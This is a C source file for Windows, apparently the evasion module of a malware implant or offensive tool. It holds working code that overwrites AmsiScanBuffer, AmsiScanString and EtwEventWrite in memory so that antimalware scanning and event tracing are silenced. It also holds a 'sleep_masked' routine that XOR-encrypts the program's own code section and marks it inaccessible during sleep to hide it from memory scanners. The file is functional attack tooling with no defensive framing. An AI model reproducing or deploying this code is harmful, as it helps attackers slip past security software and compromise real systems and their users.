#include <windows.h>
#include <string.h>
#include "evasion.h"


typedef BOOL (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);

/* Stored in .data/.bss — always accessible, even when .text is protected. */
static VProt_t   g_VProt   = NULL;
static NtDelay_t g_NtDelay = NULL;
static void     *g_text    = NULL;
static SIZE_T    g_tsz     = 0;

/* ── Startup helpers (run from .text before any sleep masking) ─────────── */

static void patch_fn(const char *mod, const char *sym) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    if (!h) return;
    FARPROC fn = GetProcAddress(h, sym);
    if (!fn) return;
    /* xor eax,eax; ret — returns AMSI_RESULT_CLEAN (0) / S_OK (0) */
    unsigned char p[3] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
    memcpy((void*)fn, p, 3);
    VirtualProtect((void*)fn, 3, old, &old);
}

static void find_text(void) {
    HMODULE base = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (memcmp(s->Name, ".text", 5) == 0) {
            g_text = (BYTE*)base + s->VirtualAddress;
            g_tsz  = s->Misc.VirtualSize;
            return;
        }
    }
}

void evasion_init(void) {
    patch_fn("amsi.dll",  "AmsiScanBuffer");
    patch_fn("amsi.dll",  "AmsiScanString");
    patch_fn("ntdll.dll", "EtwEventWrite");

    HMODULE k32   = GetModuleHandleA("kernel32.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_VProt   = (VProt_t)  GetProcAddress(k32,   "VirtualProtect");
    g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
    find_text();
}

/* ── sleep_masked lives in .evasn — executes while .text is PAGE_NOACCESS ─
 *
 * Design: all kernel calls go through function pointers in .data so they
 * bypass any .text import thunks.  The XOR loop and this function itself
 * live in .evasn, not .text.  The return address (pointing into .text) is
 * safe because we restore .text to RX before the ret instruction runs.
 */
__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    if (!g_text || !g_VProt || !g_NtDelay) {
        /* Fallback: unmasked sleep — only happens if init wasn't called */
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        if (g_NtDelay) g_NtDelay(FALSE, &t);
        return;
    }

    unsigned char *text = (unsigned char*)g_text;
    SIZE_T sz = g_tsz;
    DWORD old;

    /* 1. Make .text writable and XOR-encrypt it */
    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;

    /* 2. Seal .text from memory scanners */
    g_VProt(text, sz, PAGE_NOACCESS, &old);

    /* 3. Sleep — execution is inside ntdll.dll syscall, not .text */
    LARGE_INTEGER iv;
    iv.QuadPart = -(LONGLONG)ms * 10000LL;
    g_NtDelay(FALSE, &iv);

    /* 4. Restore — still in .evasn here */
    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
    /* ret → jumps to .text return address, now RX ✓ */
}
